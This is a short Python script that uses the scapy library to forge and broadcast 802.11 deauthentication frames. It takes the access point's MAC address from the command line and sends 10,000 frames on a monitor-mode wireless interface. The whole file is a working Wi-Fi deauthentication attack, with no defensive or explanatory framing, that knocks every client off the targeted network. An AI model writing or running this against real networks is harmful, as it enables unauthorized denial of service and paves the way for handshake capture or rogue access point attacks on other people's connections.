#!/bin/python2

import sys
from scapy.all import *

brdmac = "ff:ff:ff:ff:ff:ff"

pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = sys.argv[1], addr3 = sys.argv[1]) / Dot11Deauth()
sendp(pkt, iface="wlp6s0mon", count=10000, inter=0.2)